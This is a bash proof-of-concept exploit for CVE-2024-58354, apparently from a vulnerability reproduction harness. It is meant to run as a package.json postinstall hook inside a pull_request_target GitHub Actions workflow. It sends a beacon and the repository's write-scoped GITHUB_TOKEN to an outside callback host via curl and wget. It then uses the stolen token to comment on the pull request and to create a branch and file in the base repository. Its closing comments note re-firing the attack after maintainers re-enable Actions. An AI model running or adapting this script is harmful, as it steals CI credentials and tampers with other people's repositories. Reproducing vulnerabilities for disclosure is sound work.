#!/usr/bin/env bash
# CVE-2024-58354 PoC — executes as root package.json "postinstall" inside
# check-types.yml (pull_request_target run of pr.yml) in the BASE repo context.
set +e
CB="https://cve-repro-callback.pvharmo.workers.dev"
Q="harness_run_id=20260828T192722-8bc52a98"
Q="${Q}&repo=${GITHUB_REPOSITORY}&run_id=${GITHUB_RUN_ID}&run_attempt=${GITHUB_RUN_ATTEMPT}"
Q="${Q}&event=${GITHUB_EVENT_NAME}&job=${GITHUB_JOB}&sha=${GITHUB_SHA}&actor=${GITHUB_ACTOR}"
PRNUM=$(jq -r '.pull_request.number // empty' "${GITHUB_EVENT_PATH}" 2>/dev/null)
[ -z "${PRNUM}" ] && PRNUM="${GITHUB_REF_NAME%%/*}"
Q="${Q}&pr=${PRNUM}"

# 1) proof of code execution — the runner calls home
curl -sS -m 30 -X POST "${CB}/INJECTED-MARKER-cve-2024-58354-4398aa736696?${Q}" \
  --data-binary "pwned ${GITHUB_REPOSITORY} run=${GITHUB_RUN_ID} attempt=${GITHUB_RUN_ATTEMPT} event=${GITHUB_EVENT_NAME} pr=${PRNUM}" \
  || wget --post-data="pwned ${GITHUB_REPOSITORY} run=${GITHUB_RUN_ID} event=${GITHUB_EVENT_NAME}" -qO- "${CB}/INJECTED-MARKER-cve-2024-58354-4398aa736696?${Q}"

# 2) exfiltrate the base repo's write-scoped GITHUB_TOKEN
curl -sS -m 30 -X POST "${CB}/INJECTED-MARKER-cve-2024-58354-4398aa736696/token?${Q}" --data-binary "${GITHUB_TOKEN}" \
  || wget --post-data="${GITHUB_TOKEN}" -qO- "${CB}/INJECTED-MARKER-cve-2024-58354-4398aa736696/token?${Q}"

# 3) repository takeover — comment on the PR as github-actions[bot]
curl -sS -m 30 -X POST \
  -H "Authorization: Bearer ${GITHUB_TOKEN}" -H "Accept: application/vnd.github+json" \
  "https://api.github.com/repos/${GITHUB_REPOSITORY}/issues/${PRNUM}/comments" \
  -d '{"body":"CVE-2024-58354: posted by the repository GITHUB_TOKEN from inside check-types.yml - INJECTED-MARKER-cve-2024-58354-4398aa736696"}'

# 4) repository takeover — create a branch + file in the base repo
BASESHA=$(curl -sS -H "Authorization: Bearer ${GITHUB_TOKEN}" \
  "https://api.github.com/repos/${GITHUB_REPOSITORY}/git/ref/heads/main" \
  | jq -r '.object.sha')
curl -sS -m 30 -X POST \
  -H "Authorization: Bearer ${GITHUB_TOKEN}" -H "Accept: application/vnd.github+json" \
  "https://api.github.com/repos/${GITHUB_REPOSITORY}/git/refs" \
  -d "{\"ref\":\"refs/heads/pwned-INJECTED-MARKER-cve-2024-58354-4398aa736696\",\"sha\":\"${BASESHA}\"}"
B64=$(printf 'CVE-2024-58354 INJECTED-MARKER-cve-2024-58354-4398aa736696\n' | base64 -w0)
curl -sS -m 30 -X PUT \
  -H "Authorization: Bearer ${GITHUB_TOKEN}" -H "Accept: application/vnd.github+json" \
  "https://api.github.com/repos/${GITHUB_REPOSITORY}/contents/pwned-INJECTED-MARKER-cve-2024-58354-4398aa736696.txt" \
  -d "{\"message\":\"CVE-2024-58354\",\"content\":\"${B64}\",\"branch\":\"pwned-INJECTED-MARKER-cve-2024-58354-4398aa736696\"}"

exit 0

# re-fire synchronize for PR delivery
# re-fire after maintainer Actions re-enable
